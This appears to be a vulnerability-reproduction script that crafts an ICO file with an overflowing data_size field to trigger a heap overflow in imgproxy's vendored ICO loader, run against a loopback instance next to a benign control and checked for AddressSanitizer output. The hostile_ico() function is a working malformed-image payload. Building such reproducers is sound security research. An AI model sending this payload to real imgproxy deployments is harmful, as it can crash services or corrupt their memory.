#!/usr/bin/env python3
"""One crafted-ICO GET into one fresh loopback imgproxy process.

Usage: ico_probe.py BINARY LIBDIR TAG REQUEST_PATH [TIMEOUT]

The hostile ICO is generated here: a one-entry ICO whose largest-entry
`data_size` is 0xfffffff5, which wraps to 3 in the vendored icoload.c
allocation while the read destination stays at data+14. The benign control is
libvips' own favicon.ico test fixture, copied unchanged into this directory.
Both source and imgproxy bind to 127.0.0.1; no external address is contacted.
"""
import http.client
import http.server
import os
import socket
import struct
import subprocess
import sys
import threading
import time

SRC_HOST, SRC_PORT = "127.0.0.1", 18081
PROXY_HOST, PROXY_PORT = "127.0.0.1", 18080
HERE = os.path.dirname(os.path.abspath(__file__))


def hostile_ico():
    header = b"\x00\x00\x01\x00\x01\x00"
    entry = struct.pack("<BBBBHHII", 1, 1, 0, 0, 1, 32, 0xFFFFFFF5, 22)
    return header + entry + bytes([0x5A, 0x5B, 0x5C, 0x5D] * 8)


def short_ico():
    header = b"\x00\x00\x01\x00\x01\x00"
    entry = struct.pack("<BBBBHHII", 1, 1, 0, 0, 1, 32, 32, 22)
    return header + entry + bytes([0x5A, 0x5B, 0x5C, 0x5D] * 8)


with open(os.path.join(HERE, "ico_benign.ico"), "rb") as f:
    BENIGN_ICO = f.read()
FILES = {
    "/hostile.ico": hostile_ico(),
    "/short.ico": short_ico(),
    "/benign.ico": BENIGN_ICO,
}


class Source(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = FILES.get(self.path)
        if body is None:
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header("Content-Type", "image/x-icon")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def wait_port(host, port, seconds=12.0):
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        try:
            with socket.create_connection((host, port), 0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def main():
    binary, libdir, tag, request_path = sys.argv[1:5]
    timeout = float(sys.argv[5]) if len(sys.argv) > 5 else 8.0

    srv = http.server.ThreadingHTTPServer((SRC_HOST, SRC_PORT), Source)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    env = dict(os.environ)
    env.update({
        "IMGPROXY_BIND": f"{PROXY_HOST}:{PROXY_PORT}",
        "IMGPROXY_BASE_URL": f"http://{SRC_HOST}:{SRC_PORT}/",
        "IMGPROXY_WORKERS": "1",
        "IMGPROXY_CONCURRENCY": "1",
        "IMGPROXY_LOG_LEVEL": "info",
        "LD_LIBRARY_PATH": libdir,
        "IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES": "true",
    })
    logpath = os.path.join(HERE, f"http-ico-{tag}.log")
    log = open(logpath, "wb")
    proc = subprocess.Popen([binary], env=env, stdout=log, stderr=subprocess.STDOUT)
    status, body, err = "-", "", ""
    try:
        if not wait_port(PROXY_HOST, PROXY_PORT):
            print(f"ICO_ONE tag={tag} PROXY_LISTEN=FAIL", flush=True)
            return 2
        started = time.monotonic()
        try:
            conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=timeout)
            conn.request("GET", f"/insecure/{request_path}",
                         headers={"Host": PROXY_HOST})
            resp = conn.getresponse()
            status = resp.status
            body = resp.read(600).decode("utf-8", "replace").replace("\n", "\\n")
            conn.close()
        except Exception as exc:
            err = f"{type(exc).__name__}: {exc}"
        elapsed = time.monotonic() - started
        time.sleep(0.3)
        rc = proc.poll()
        print(f"ICO_ONE tag={tag} path={request_path} status={status} "
              f"elapsed={elapsed:.3f} rc={rc} err={err!r} body={body[:300]!r} "
              f"log={logpath}", flush=True)
        return 0
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=5)
        log.flush()
        log.close()
        srv.shutdown()
        srv.server_close()
        with open(logpath, "rb") as f:
            lines = f.read().decode("utf-8", "replace").splitlines()
        for line in lines:
            if 'level="ERROR"' in line or "corrupted top size" in line \
                    or "AddressSanitizer" in line:
                print(f"ICO_LOG tag={tag} {line[:500]}", flush=True)
                break


if __name__ == "__main__":
    sys.exit(main())
